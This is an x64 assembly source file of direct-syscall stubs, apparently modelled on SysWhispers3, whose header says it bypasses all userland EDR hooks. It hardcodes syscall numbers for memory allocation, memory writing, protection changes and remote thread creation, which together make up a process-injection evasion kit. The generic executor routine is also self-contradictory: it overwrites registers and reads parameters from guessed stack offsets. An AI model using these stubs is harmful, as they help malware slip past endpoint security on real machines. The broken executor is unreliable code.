; Direct Syscalls - x64 Assembly Stubs
; Based on SysWhispers3 methodology
;
; This assembly code executes syscalls directly without going through
; hooked Win32 APIs, bypassing ALL userland EDR hooks.

.CODE

; ================================================================
; ExecuteSyscall - Generic syscall executor
;
; Parameters:
;   RCX = Syscall number
;   RDX = Syscall instruction address
;   R8-R9, stack = Syscall parameters
;
; Returns:
;   RAX = NTSTATUS
; ================================================================

ExecuteSyscall PROC
    ; Save syscall number and address
    mov r10, rcx                ; Save syscall number
    mov r11, rdx                ; Save syscall address

    ; Move parameters into correct registers for syscall
    ; Windows x64 calling convention → NT calling convention
    mov r10, rcx                ; First param was syscall number, get actual param
    mov eax, r10d               ; Syscall number into EAX

    ; Parameters are already in correct registers:
    ; RCX = param1 (but we used it for syscall#, so restore from R8)
    ; RDX = param2 (but we used it for address, so restore from R9)
    ; R8 = param3
    ; R9 = param4
    ; Stack = param5+

    ; Shift parameters (they're offset by 2 because of our wrapper)
    ; This is complex - instead, we'll use a different approach

    ; Restore original parameters from stack
    mov rcx, [rsp + 28h]        ; Get real first parameter
    mov rdx, [rsp + 30h]        ; Get real second parameter
    mov r8,  [rsp + 38h]        ; Get real third parameter
    mov r9,  [rsp + 40h]        ; Get real fourth parameter

    ; EAX already has syscall number
    ; R10 = RCX (required for syscall convention)
    mov r10, rcx

    ; Execute syscall
    jmp r11                     ; Jump to syscall instruction in ntdll

    ret
ExecuteSyscall ENDP

; ================================================================
; Alternative: Individual syscall stubs (more reliable)
; ================================================================

; NtAllocateVirtualMemory stub
Syscall_NtAllocateVirtualMemory_Stub PROC
    mov r10, rcx
    mov eax, 18h                ; Syscall number (Windows 10/11 x64)
    syscall
    ret
Syscall_NtAllocateVirtualMemory_Stub ENDP

; NtWriteVirtualMemory stub
Syscall_NtWriteVirtualMemory_Stub PROC
    mov r10, rcx
    mov eax, 3Ah                ; Syscall number
    syscall
    ret
Syscall_NtWriteVirtualMemory_Stub ENDP

; NtProtectVirtualMemory stub
Syscall_NtProtectVirtualMemory_Stub PROC
    mov r10, rcx
    mov eax, 50h                ; Syscall number
    syscall
    ret
Syscall_NtProtectVirtualMemory_Stub ENDP

; NtCreateThreadEx stub
Syscall_NtCreateThreadEx_Stub PROC
    mov r10, rcx
    mov eax, 0C1h               ; Syscall number
    syscall
    ret
Syscall_NtCreateThreadEx_Stub ENDP

; NtClose stub
Syscall_NtClose_Stub PROC
    mov r10, rcx
    mov eax, 0Fh                ; Syscall number
    syscall
    ret
Syscall_NtClose_Stub ENDP

; NtReadVirtualMemory stub
Syscall_NtReadVirtualMemory_Stub PROC
    mov r10, rcx
    mov eax, 3Fh                ; Syscall number
    syscall
    ret
Syscall_NtReadVirtualMemory_Stub ENDP

; NtQuerySystemInformation stub
Syscall_NtQuerySystemInformation_Stub PROC
    mov r10, rcx
    mov eax, 36h                ; Syscall number
    syscall
    ret
Syscall_NtQuerySystemInformation_Stub ENDP

END
